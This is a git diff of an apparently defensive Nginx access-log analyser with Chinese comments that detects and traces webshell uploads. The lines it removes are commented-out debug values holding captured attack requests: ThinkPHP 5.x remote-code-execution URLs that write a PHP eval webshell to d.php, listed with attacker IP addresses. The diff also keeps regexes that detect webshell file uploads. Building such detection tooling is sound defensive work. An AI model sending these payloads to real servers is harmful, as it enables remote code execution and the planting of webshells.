@@ -424,7 +424,6 @@ class NginxAccessLogAnalyze(ColorPrint):
         '''
         self.cyanPrint("[*][{}] 正在分析攻击TOP1地址信息...".format(time.strftime("%H:%M:%S", time.localtime())))
         top_10_list = self.top10Sort(self.vuln_ip_addr)[::-1]
-        # top_10_list = [('8.131.102.198', 1), ('8.133.170.246', 1), ('8.133.171.26', 1), ('39.106.91.233', 2), ('111.221.46.15', 4), ('47.110.180.33', 4), ('47.110.180.46', 4), ('107.161.50.66', 5), ('117.50.18.16', 153), ('183.136.190.62', 3267)][::-1]
         top_one_ip = top_10_list[0]
         ip_all_attack = 0
         attack_effective = 0
@@ -471,8 +470,6 @@ class NginxAccessLogAnalyze(ColorPrint):
         '''
         self.redPrint("[+][{}] 发现Webshell上传日志，正在进行追踪分析...".format(time.strftime("%H:%M:%S", time.localtime())))
         up_shell_re_list = ["[&|?]\w+\=(.*?\.ph\w+)[|&]" ,"[&|?]\w+\=(.*?\.js[p-x]{1,2})[|&]", "[&|?]\w+\=(.*?\.as[p-x]{1,2})[|&]", "[&|?]\w+\=(.*?\.ashx)[|&]"]
-        # 调试值
-        # self.webshell_act_dict = {'111.221.46.15': [['111.221.46.15', 1618075124, 'GET', '/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=d.php&vars[1][]=<?php @eval($_POST[spread]);?>', '200', '6163', 'Webshell上传'], ['111.221.46.15', 1618075126, 'GET', '/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=d.php&vars[1][]=<?php @eval($_POST[spread]);?>', '200', '6163', 'Webshell上传'], ['111.221.46.15', 1618075131, 'GET', '/index.php?s=index/\\think\\Request/input&cacheFile=d.php&content=<?php @eval($_POST[spread]);?>', '200', '6163', 'Webshell上传'], ['111.221.46.15', 1618075133, 'GET', '/index.php?s=index/\\think\\view\\driver\\Php/display&cacheFile=d.php&content=<?php @eval($_POST[spread]);?>', '200', '6163', 'Webshell上传']]}
         for k, v in self.webshell_act_dict.items():
             for value in v:
                 up_file_path = ''
@@ -508,8 +505,6 @@ class NginxAccessLogAnalyze(ColorPrint):
 
     # webshell连接日志分析，输出树状图json格式
     def webShellTrace(self):
-        # 调试值
-        # self._webshell_trace = {'111.221.46.15': [['2021-04-11 01:18:44', 'GET', 'index/\\think\\app/invokefunction/d.php', '<?php @eval($_POST[spread]);?>', '200', '6163', 'thinkphp5.x远程代码执行漏洞'], ['2021-04-11 01:18:46', 'GET', 'index/\\think\\Container/invokefunction/d.php', '<?php @eval($_POST[spread]);?>', '200', '6163', 'thinkphp5.x远程代码执行漏洞'], ['2021-04-11 01:18:51', 'GET', 'index/\\think\\Request/input/zeyan-53132678.jsp', '<?php @eval($_POST[spread]);?>', '200', '6163', 'thinkphp5.x远程代码执行漏洞'], ['2021-04-11 01:18:53', 'GET', 'index/\\think\\view\\driver\\Php/display/d.php', '<?php @eval($_POST[spread]);?>', '200', '6163', 'thinkphp5.x远程代码执行漏洞']], "183.136.190.62": [['2021-04-11 01:18:53', 'GET', 'index/\\think\\view\\driver\\Php/display/zeyan-53132678.jsp', '<?php @eval($_POST[spread]);?>', '200', '6163', 'thinkphp5.x远程代码执行漏洞']]}
         self.webshell_req_dict = {"name": "WebShell分析树", "children": []}
         webshell_file_name = {}
         count = 0
